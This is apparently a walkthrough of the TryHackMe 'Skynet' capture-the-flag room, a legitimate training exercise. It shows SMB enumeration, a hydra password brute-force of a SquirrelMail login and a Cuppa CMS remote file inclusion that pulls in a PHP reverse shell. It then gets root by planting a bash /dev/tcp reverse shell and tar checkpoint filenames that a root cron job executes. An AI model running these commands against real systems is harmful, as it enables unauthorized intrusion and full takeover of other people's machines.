This is a walkthrough for the [TryHackMe][thm] room: [Skynet][skynet]. Let’s get started!

# Deploy and Compromise the machine
Since we don’t know anything about this machine, let’s start with an nmap scan! The command I used was: `nmap -sC -sV -oN nmap.txt <machine_ip>`

![s1](/img/thm/skynet/s1.webp)

We can see that we have `ssh`, `http`, `pop3`, `smb`, and `imap` open. We can immediately eliminate `ssh` as an attack vector, so we need to focus on the others. First answer is asking for a password to an email, so let’s start by looking at the website.

![s2](/img/thm/skynet/s2.webp)

We don’t see much here. Let’s run a gobuster scan in order to gather some directories. I used this command: `gobuster dir -u http://10.10.8.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

gobuster finds a few directories, however we aren’t able to access them. We get a **Forbidden** message. I will let gobuster continue running in the background, but let’s checkout the smb avenue.

If we use the `smbclient` we see the following (Hit **Enter** when prompted for a password):

![s3](/img/thm/skynet/s3.png)

We definitely see some interesting share’s here. We have a possible username: milesdyson. Lets checkout that share: `smbclient \\\\10.10.8.13\\milesdyson` 

Unfortunately, we don’t have access. Instead, let’s try the `anonymous` share.

We are in! We see `attention.txt` and `logs`. Run: `get attention.txt` to download the file.

![s4](/img/thm/skynet/s4.png)

Hmm…that’s interesting! Maybe the logs caught some people’s passwords? Let’s see!

`cd` into the logs directory, and we see 3 files. The only one that has any date (due to the size) is `logs1.txt`. Let’s download that and take a look!

![s5](/img/thm/skynet/s5.png)

This looks very promising!! This looks like it could be some passwords? We could use this as a wordlist in `hydra` if we can find a login page anywhere. Let’s check back with `gobuster`.

We see one new entry `/squirrelmail`. Let’s see if we can reach this page!

![s6](/img/thm/skynet/s6.webp)

Success!! Now we “think” we already know a username: `milesdyson`, but we don’t know his password. We could try each entry in that list one-by-one, but that might take some time. Let’s try to use hydra against the login. Format your `hydra` like the following:

```bash
hydra -l milesdyson -P <password_wordlist> <machine_ip> <request_type> '<login_page>:<request_body>:<invalid_notification>'
```

If you are unsure as to what those mean, or how to find them, read this article on the topic: here. Our command will be the following:

```bash
hydra -l milesdyson -P log1.txt 10.10.8.13 http-post-form '/squirrelmail/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.'
```

![s7](/img/thm/skynet/s7.webp)

Perfect! Our first answer! Let’s login to the mail! If we look at the emails we find a **Samba Password reset** email.

![s8](/img/thm/skynet/s8.png)

After looking around more, there doesn’t seem to be anything else. Let’s login to the `milesdyson` samba share using that password!

`smbclient -U milesdyson \\\\10.10.8.13\\milesdyson`

When we `ls` the share, we see a few items in there. One that sticks out to me is the notes directory.

When we look at the notes directory, there are a lot of files in it, but which one is important?? `get important.txt`

![s9](/img/thm/skynet/s9.png)

There is our next answer! Now we can navigate to that directory.

![s10](/img/thm/skynet/s10.webp)

Hmm…not much here. But we did see a mention of `CMS` in the `important.txt` file. Let’s run a gobuster scan against this URL:

`gobuster dir -u http://10.10.8.13/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

Eventually, we get back an `/administrator` page. Navigate to that page.

![s11](/img/thm/skynet/s11.webp)

We see it is using **Cuppa CMS**. Let’s see if there are any exploits for this in `searchsploit`.

`searchsploit cuppa`
`cat /usr/share/exploitdb/exploits/php/webapps/25971.txt`

Reading through, we get our third answer. Now let’s use the exploit!

First, we need to know how we can use a file in order to get a shell on a machine. In this case, we know this is using .php. Let’s use `php-reverse-shell.php`! This can be found [here][php-rev-shell]. Make sure to change the parameters to your machine and IP you will use to listen for the reverse shell!

![s12](/img/thm/skynet/s12.png)

Now we need to start a http server on our machine in the folder where the reverse shell file is located: `python3 -m http.server 80`

Start a netcat listener on the specified port: `nc -nvlp 1234`

Then curl or navigate to the following url:

`http://10.10.8.13/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<thm_tun0_ip>:80/php-reverse-shell.php`

When you navigate to your terminal with the netcat listener, you should see a shell! Let’s look for the user flag.

![s13](/img/thm/skynet/s13.png)

Now we need to escalate our privileges for the root flag! Before we do anything else, let’s get into a better shell using python:

`python -c 'import pty; pty.spawn("/bin/bash")'`

Let’s see if we have any sudo permissions: `sudo -l`, nope! Maybe there are `cron` jobs running as root?

`cat /etc/crontab`

We see there is a `backup.sh` that runs every minute! There’s our target. Let’see what’s in there: `cat /home/milesdyson/backups/backup.sh`

![s14](/img/thm/skynet/s14.png)

We need to use this cron job to gain a shell. I wonder if there is a way to execute a shell from tar? Let’s check out [GTFObins][gtfo]. We can search for the `tar` command, and we see a few options. Let’s try the first one:

`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

We can use this to get a shell, but we need to create some things first:

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/<thm_tun0_ip>/1235 0>&1' > /var/www/html/shell
chmod +x /var/www/html/shell
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=bash\ shell
```

Now we can open up a `netcat` listener to get the reverse shell: `nc -nvlp 1235`
**NOTE:** This could take up to a minute for the shell to come through

We have a root shell! Let’s find our root flag!
